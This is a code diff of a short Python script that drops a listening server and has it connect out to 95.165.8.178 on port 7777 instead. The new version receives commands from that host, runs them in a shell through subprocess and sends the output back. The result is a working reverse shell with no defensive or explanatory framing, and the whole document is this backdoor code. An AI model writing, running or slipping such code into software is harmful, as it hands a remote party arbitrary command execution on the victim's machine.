@@ -1,22 +1,19 @@
 import socket
+import subprocess
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(('95.165.8.178', 7777))
-s.listen(5)
 
 
-client, addr = s.accept()
+s.connect(('95.165.8.178', 7777))
 
 
 while True:
-    command = input('Enter command: ')
-    client.send(command.encode())
+    command = s.recv(4096).decode()
     if command.lower() == 'exit':
         break
-    result_output = client.recv(4096).decode()
-    print(result_output)
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
 
 
-client.close()
 s.close()
